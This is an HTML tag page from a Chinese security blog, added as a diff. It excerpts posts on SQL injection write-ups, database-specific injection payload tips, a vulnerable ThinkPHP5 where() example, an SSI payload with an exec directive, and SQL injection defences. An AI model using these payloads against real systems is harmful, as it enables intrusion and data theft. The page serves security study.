@@ -1,0 +1,1131 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>injection - Reber's Blog</title>
+    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
+    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
+    <meta name="author" content="reber">
+    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
+    <!--[if lte IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
+    <![endif]-->
+    <!--[if gt IE 8]><!-->
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
+    <!--<![endif]-->
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css">
+    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
+    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
+    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
+    <script src="/js/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script src="/js/jquery.min.js"></script>
+</head>
+<body>
+
+
+
+<div class="reber">
+    
+<div class="head">
+    <h1 class="logo" id="logo">
+        <a href="/"><img src='/img/logo.png' width='70px'></a>
+    </h1>
+    <ul class="nav">
+        
+            
+                <li>
+                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+            
+                </li>
+        
+    </ul>
+</div>
+
+    
+    <div class="main">
+        <div class="left">
+            
+            <div class="content">
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2020/recording-a-injection-bypass/">记一次 SQL 注入简单 bypass</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2020-06-22
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 存在 SQL 注入 总之是遇到一个站，登录的页面，数据包大致如下：
+POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1 Host: 115.xxx.xxx.xxx:8042 Content-Length: 47 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://115.xxx.xxx.xxx:8042 Referer: http://115.xxx.xxx.xxx:8042/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt Connection: close uname=admin*&amp;pwd=dskfsdkf&amp;valCode=1197&amp;telphone=  其中验证码可以绕过，而登录名那里存在注入 使用 and 1=1、and 1=2 时，发现过滤了空格，用/**/代替 0x01 简单看一下 中间件是 IIS，存在 len 函数，确定为 SQLServer Order by 一下，看看能不能 union，发现有 10 列 尝试 union select admin 转换为 int 时出错，感觉好像能显示位，测试发现确实可以显示 可以获取数据库版本，可以确定有 union 注入了 0x02 sqlmap sqlmap跑一下：sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2020/recording-a-injection-bypass/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/">通过 selenium 和 flask 中转后利用 sqlmap 进行注入</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2019-07-27
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 先说前提 昨天某个小伙伴说有个注入没法搞 前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了 0x01 找加密的 js 文件 注入的地方是获取验证码时的手机号, 刚开始想着先找到 js 加密的函数, 然后生成 sign 再组数据包发送。
+就像 记一次SQL Server报错注入 中一样, 用 selenium 或者 PhantomJS 执行 js 代码生成sign
+一番查找发现了加密的 js 文件函数, 但是用的是 angular 这个前端框架, 没用过这个东西。。。。。 能看懂一般的 js 代码, 但是这个没得搞, 不懂。。。
+0x02 数据中转 本来昨天我已经放弃了的, 结果今天上午小伙伴又找我了, 说还没有整好, 又看了一通 js, 仍然无解, 看不懂。。。
+想起昨天有个大佬说用 PhantomJS + flask 这样、那样、再这样, 中转数据就可以用 sqlmap 跑了, emmmmm。。。
+
+虽然很早以前用过 asp 的 Cookie 注入中转 , 但是那个是软件, 一直没有搞懂原理, 现在正好趁机学下
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2019/injection-tips-of-oracle/">SQL注入tips(Oracle)</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2019-01-04
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/oracle">oracle</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 判断数据库类型  Oracle有一些自带的表：dual、user_tables
+ id=45 and (select count(*) from user_tables)&gt;0-- id=45 and (select count(*) from dual)&gt;0--  利用自带的一些函数：譬如utl_http.request 这些
+ 利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)
+  0x01 基本信息获取  查看sid
+select instance_name from v$instance;  查看数据库版本：
+select banner from v$version where rownum=1; select banner from sys.v_$version where rownum=1;  查看用户：
+select user from dual; --当前用户 select username from user_users; --当前用户 select username from all_users; --查看所有用户 select username from dba_users; --查看所有用户(需要有权限)  查看当前用户角色：
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2019/injection-tips-of-oracle/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">记一次SQL Server报错注入</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2018-12-24
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
+用户不存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;用户名不存在！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
+用户名存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;密码不正确！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
+可以的，验证码前端验证，我觉得可以burp抓包intruder一下
+跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad
+0x01 存在注入 嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！ 可以的，and 1=1 有注入
+哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？
+刚才看了数据包，用户名密码都是32位，猜想sql语句是：select password from user where username=name_md5_hash，然后判断用户存不存在之类的
+看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。
+试试post其他用户名和密码，然后看数据包 显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个 emmmmm，想了想，应该可以注入的，看看啥系统 大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server 看看数据库版本，嗯，看来还是报错注入 可以可以，看看有几列，然后进行union注入 一列，这里也能大致猜出来sql语句了，估计就是：select password from user where username='admin'
+那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。
+得到第一个数据库的名字：union select name from master.dbo.sysdatabases where dbid=1 得到第二个数据库的名字：union select name from master.dbo.sysdatabases where dbid=2 得到第5个数据库的名字：union select name from master.dbo.sysdatabases where dbid=5 好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。
+py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2018/injection-tips-of-sqlserver/">SQL注入tips(SQL Server)</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2018-09-04
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&lt;01&gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysadmin')));   得到所有数据库名字   --得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 id=1 and 0&lt;&gt;(select name from master.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2018/injection-tips-of-sqlserver/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2018/injection-tips-of-mysql/">SQL注入tips(MySQL)</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2018-05-23
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        环境：MySQL 5.5.47
+0x00 注入点在Order by后面 mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt'; Query OK, 1 row affected (0.01 sec)  mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~msg~'  mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: '~rtest~'  mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2)); +----------+ | name | +----------+ | xiaohong | +----------+ 1 row in set (0.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2018/injection-tips-of-mysql/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2018/thinkphp5-where-function/">ThinkPHP5的where函数</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2018-04-16
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/php">PHP</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
+0x01 示例代码 tp5/application/home/controller/Index.php
+&lt;?php namespace app\home\controller; use think\Db; class Index { //http://127.0.0.1/Source/tp5/home/index/testdb/id/1 public function testDb() { // 调用 tp5/thinkphp/library/think/Db.php 的 connect() 函数 初始化数据库，并取得数据库类实例 $msg = db('msg'); $id = input('param.id',1); //不存在id的话默认为1 //在Db.php中use think\db\Query; $msg-&gt;where()则调用了Query.php中的where函数进入查询流程 $result = $msg-&gt;where(&quot;id=&quot;.$id)-&gt;select(); // $result = $msg-&gt;where(['id'=&gt;$id])-&gt;select(); echo '&lt;br/&gt;&lt;hr/&gt;执行的sql语句：'; echo $msg-&gt;getLastSql(); echo '&lt;br/&gt;最终得到的结果：'; echo var_dump($result); } }  where函数接收字符串和数组时，访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1执行的SQL语句分别如下：
+SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，当payload为: ) and 1=1 and (1)=(1时判断返回如下： 主要调用文件及函数顺序如下：
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2018/thinkphp5-where-function/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2017/ssi-injection/">SSI注入</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2017-06-08
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
+在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
+若注入点在url中则可能需要进行url编码
+0x01 payload &quot;--&gt;'--&gt;`--&gt;&lt;!--#set var=&quot;a&quot; value=&quot;123&quot;--&gt;&lt;!--#set var=&quot;b&quot; value=&quot;654&quot;--&gt;&lt;!--#echo var=&quot;a&quot;--&gt;&lt;!--#echo var=&quot;b&quot;--&gt; &lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt; &lt;!--#exec cmd=&quot;dir&quot; --&gt;  0x02 示例  Referer被输出到了页面中   url中的数据被输出到页面中(有时候url中的payload需要url编码)  
+    </p>
+
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/">[转]MySQL报错注入原理分析(count()、rand()、group by)</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-11-13
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        原文链接：http://drops.wooyun.org/tips/14312
+0x00 疑问 一直在用mysql数据库报错注入方法，但为何会报错？
+百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。
+0x01 位置问题？ select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;这是网上最常见的语句,目前位置看到的网上sql注入教程,floor 都是直接放count(*)后面，为了排除干扰，我们直接对比了两个报错语句，如下图
+由上面的图片，可以知道报错跟位置无关。
+0x02 绝对报错还是相对报错？ 是不是报错语句有了floor(rand(0)*2)以及其他几个条件就一定报错？其实并不是如此，我们先建建个表，新增一条记录看看，如下图： 确认表中只有一条记录后，再执行报错语句看看，如下图： 多次执行均未发现报错。
+然后我们新增一条记录。 然后再测试下报错语句 多次执行并没有报错
+OK 那我们再增加一条 执行报错语句 ok 成功报错
+由此可证明floor(rand(0)*2)报错是有条件的，记录必须3条以上，而且在3条以上必定报错，到底为何？请继续往下看。
+0x03 随机因子具有决定权么(rand()和rand(0)) 为了更彻底的说明报错原因，直接把随机因子去掉，再来一遍看看，先看一条记录的时候，如下图: 一条记录的话 无论执行多少次也不报错
+然后增加一条记录。
+两条记录的话 结果就变成不确定性了 随机出现报错。
+然后再插入一条
+三条记录之后，也和2条记录一样进行随机报错。
+由此可见报错和随机因子是有关联的，但有什么关联呢，为什么直接使用rand()，有两条记录的情况下就会报错，而且是有时候报错，有时候不报错，而rand(0)的时候在两条的时候不报错，在三条以上就绝对报错？我们继续往下看。
+0x04 不确定性与确定性 前面说过，floor(rand(0)*2)报错的原理是恰恰是由于它的确定性，这到底是为什么呢？从0x03我们大致可以猜想到，因为floor(rand()*2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)*2)就一定报错，由此可猜想floor(rand()*2)是比较随机的，不具备确定性因素，而floor(rand(0)*2)具备某方面的确定性。
+为了证明我们猜想，分别对floor(rand()*2)和floor(rand(0)*2)在多记录表中执行多次(记录选择10条以上)，在有12条记录表中执行结果如下图：
+mysql&gt; select floor(rand()*2) from `T-Safe`; +-----------------+ | floor(rand()*2) | +-----------------+ | 0 | | 0 | | 0 | | 0 | | 0 | | 0 | | 1 | | 0 | | 0 | | 0 | | 0 | | 0 | +-----------------+ 12 rows in set (0.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/injection-of-defense/">SQL注入之防御</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-06-25
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 要做的事 也就是找到注入点然后修复
+0x01 防御方法  使用预编译语句绑定变量(比如php的mysqli、pdo)
+&lt;?php //预编译 $mysqli = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;share&quot;); $mysqli-&gt;query(&quot;set names utf8&quot;); $sql = &quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&quot;; $s = $mysqli-&gt;prepare($sql); //绑定参数 $name = &quot;Tom&quot;; $sex = &quot;M&quot;; $age = 23; $s-&gt;bind_param(&quot;ssi&quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&gt;execute(); var_dump($result); $s-&gt;close(); ?&gt;  使用存储过程(这里以SQLServer举例)
+  --如果存在名为get_student_msg(相当于函数)的存储过程则删除 IF EXISTS (SELECT name FROM sysobjects WHERE name='get_student_msg' AND type='p') DROP PROCEDURE get_student_msg CREATE PROCEDURE get_student_msg --创建存储过程 @name VARCHAR(20) --声明全局变量 AS BEGIN SELECT * from info WHERE name=@name END GO --创建好存储过程后在其他地方直接使用函数并传参就行了 EXEC get_student_msg 'xiaoli'   使用转义函数
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/injection-of-defense/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+
+                
+
+
+    
+    
+    <nav class="pagination" role="pagination">
+        
+            <i class="fa fa-chevron-left"></i>
+        
+
+        <span>&nbsp;1 / 2&nbsp;</span>
+        
+        
+            <a href="/tags/injection/page/2/"><i class="fa fa-chevron-right"></i></a>
+        
+    </nav>
+
+
+            </div>
+        </div>
+        <div class="right">
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Categorie<a href="/single/index.html" class="single" target="_blank">s</a></h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/database" title="database">database(12)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/git" title="git">git(6)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/linux" title="linux">linux(26)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/other" title="other">other(14)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/php" title="php">php(12)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/python" title="python">python(32)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/server" title="server">server(10)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="https://wyb0.com/topics/windows" title="windows">windows(4)</a>
+            </li>
+        
+    </ul>
+
+
+</div>
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Tags</h2>
+    <div class="taglist" id="tags">
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/ajax" title="ajax">ajax</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/cgi" title="cgi">cgi</a>
+                <sup>1</sup>
